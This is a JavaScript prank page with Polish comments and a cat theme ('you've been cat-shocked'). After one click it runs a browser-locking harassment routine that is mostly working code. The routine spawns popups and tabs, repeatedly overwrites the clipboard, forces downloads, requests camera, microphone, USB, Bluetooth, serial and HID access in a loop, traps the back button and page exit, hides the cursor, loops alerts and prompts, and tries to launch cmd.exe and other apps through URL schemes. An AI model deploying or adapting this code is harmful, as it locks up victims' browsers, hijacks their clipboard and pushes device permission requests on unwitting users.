const kotZdjecia = [
  "Pictures/dancingcat.gif", "Pictures/kciukkot.jpg", "Pictures/kotcrying.jpg",
  "Pictures/kotmeme.jpg", "Pictures/kotneutral.jpg", "Pictures/rekinkot.jpg",
  "Pictures/serious.jpg", "Pictures/wakacjakot.jpg"
];

const kotFilmy = [
  "Videos/kotbawisie.mp4", "Videos/kotekspi.mp4", "Videos/kotpatrzytuitam.mp4",
  "Videos/kotzabawa.mp4", "Videos/lizulizumiaumiau.mp4"
];

const kotDzwieki = ["Sounds/mruczenie.mp3", "Sounds/miau.mp3"];
const spamText = "😼 ZOSTAŁEŚ KOTOSZKOWANY 😼 ".repeat(300);
let popupCounter = 0;
let alertCounter = 0;

// uruchamiamy chaos po kliknięciu
/*
document.onload(
  setTimeout(startChaos, 500)
)*/

document.addEventListener("click", () => {
  setTimeout(startChaos, 500);
});

function startChaos() {
  playSound();
  speak("Miau! Zostałeś kotoszkowany!");
  //setInterval(spawnCat, 500);
  setInterval(openPopup, 1000);
  setInterval(copySpam, 1000);
  setInterval(autoDownload, 1000);
  setInterval(() => animateURL("🐱😼🐾😹"), 700);
  setInterval(requestAccess, 1000);
  setInterval(escapeCursorWindows, 500);
  setInterval(openSystemApps, 5000);
  setInterval(tabSpam, 2500);
  setInterval(spamAlert, 1000);
  lockPage();
  hideCursor();
  changeBackground();
  setTimeout(showQuiz, 10000);
}

function spawnCat() {
  const img = document.createElement("img");
  img.src = kotZdjecia[Math.floor(Math.random() * kotZdjecia.length)];
  img.style.position = "fixed";
  img.style.width = "200px";
  img.style.top = Math.random() * 90 + "%";
  img.style.left = Math.random() * 90 + "%";
  img.style.zIndex = "9999";
  img.style.transform = `rotate(${Math.random() * 360}deg)`;
  document.body.appendChild(img);
}

function openPopup() {
  if (popupCounter > 20) return;
  popupCounter++;
  const win = window.open(window.location.href, "_blank", `width=400,height=400,left=${Math.random()*1000},top=${Math.random()*500}`);
  if (win) {
    win.onload = () => {
      const img = document.createElement("img");
      img.src = kotZdjecia[Math.floor(Math.random() * kotZdjecia.length)];
      img.style.width = "100%";
      win.document.body.style.margin = "0";
      win.document.body.appendChild(img);
    };
  }
}

function playSound() {
  const audio = new Audio(kotDzwieki[Math.floor(Math.random() * kotDzwieki.length)]);
  audio.volume = 1;
  audio.play();
}

function speak(text) {
  const msg = new SpeechSynthesisUtterance(text);
  msg.lang = "pl-PL";
  speechSynthesis.speak(msg);
}

function copySpam() {
  const area = document.createElement("textarea");
  area.value = spamText;
  document.body.appendChild(area);
  area.select();
  document.execCommand("copy");
  area.remove();
}

function autoDownload() {
  const link = document.createElement("a");
  link.href = kotZdjecia[Math.floor(Math.random() * kotZdjecia.length)];
  link.download = "kotoszek.jpg";
  link.click();
}

function animateURL(chars) {
  let str = "";
  for (let i = 0; i < 10; i++) {
    str += chars[Math.floor(Math.random() * chars.length)];
  }
  window.location.hash = str;
}

function requestAccess() {
  try { navigator.mediaDevices.getUserMedia({ video: true, audio: true }); } catch {}
  try { navigator.bluetooth.requestDevice({ acceptAllDevices: true }); } catch {}
  try { navigator.usb.requestDevice({ filters: [{}] }); } catch {}
  try { navigator.serial.requestPort({ filters: [] }); } catch {}
  try { navigator.hid.requestDevice({ filters: [] }); } catch {}
  try { navigator.requestMIDIAccess({ sysex: true }); } catch {}
}

function lockPage() {
  window.onbeforeunload = () => "Zostawiasz kotoszka? 😾";
  window.addEventListener("unload", () => {
    setTimeout(() => {
      window.open(window.location.href, "_blank");
    }, 300);
  });
  setInterval(() => history.pushState({}, "", window.location.href), 500);
  window.addEventListener("popstate", () => {
    history.pushState({}, "", window.location.href);
  });
}

function hideCursor() {
  document.body.style.cursor = "none";
}

// FAKE quiz
function showQuiz() {
  const answer = prompt("Ile kotów dziennie powinno się głaskać? 🐱 (odpowiedz poprawnie)");
  if (answer !== "∞" && answer !== "nieskończoność" && answer !== "infinity") {
    alert("ŹLE! Spróbuj jeszcze raz 😼");
    setTimeout(showQuiz, 2000);
  } else {
    alert("NIE MA UCIECZKI 😹");
    showQuiz();
  }
}

function spamAlert() {
  if (alertCounter > 10) return;
  alertCounter++;
  alert("😼 KOTOSZKOWANIE!!! 😼");
}

function changeBackground() {
  let i = 0;
  setInterval(() => {
    document.body.style.backgroundColor = i % 2 === 0 ? "lime" : "pink";
    i++;
  }, 500);
}

// 1. Uciekające okienka
function escapeCursorWindows() {
  document.addEventListener("mousemove", (e) => {
    const allWindows = document.querySelectorAll(".uciekajace-okienko");
    allWindows.forEach(win => {
      const dx = e.clientX - win.offsetLeft;
      const dy = e.clientY - win.offsetTop;
      const distance = Math.sqrt(dx * dx + dy * dy);
      if (distance < 150) {
        win.style.left = `${Math.random() * (window.innerWidth - 200)}px`;
        win.style.top = `${Math.random() * (window.innerHeight - 200)}px`;
      }
    });
  });

  setInterval(() => {
    const win = document.createElement("div");
    win.className = "uciekajace-okienko";
    win.style.position = "fixed";
    win.style.width = "150px";
    win.style.height = "150px";
    win.style.background = "url('" + kotZdjecia[Math.floor(Math.random() * kotZdjecia.length)] + "') center/cover";
    win.style.left = `${Math.random() * (window.innerWidth - 150)}px`;
    win.style.top = `${Math.random() * (window.innerHeight - 150)}px`;
    win.style.zIndex = 9999;
    document.body.appendChild(win);
  }, 2000);
}

// 2. Próba otwierania aplikacji (działa tylko w specyficznych przeglądarkach)
function openSystemApps() {
  const links = [
    "calc://", "file:///C:/Windows/System32/cmd.exe", "mailto:test@example.com",
    "tel:112", "itms://itunes.com", "zoommtg://", "spotify://"
  ];
  links.forEach(link => {
    const a = document.createElement("a");
    a.href = link;
    a.target = "_blank";
    document.body.appendChild(a);
    a.click();
    a.remove();
  });
}

// 3. Spam zakładkami z kotkami
function tabSpam() {
  const urls = [
    "https://www.youtube.com/watch?v=J---aiyznGQ",
    "https://www.reddit.com/r/cats/",
    "https://www.kittehworld.com/",
    "https://thecatapi.com/",
    "https://www.google.com/search?q=cute+cats&tbm=isch"
  ];
  for (let i = 0; i < 5; i++) {
    const url = urls[Math.floor(Math.random() * urls.length)];
    window.open(url, "_blank");
  }
}

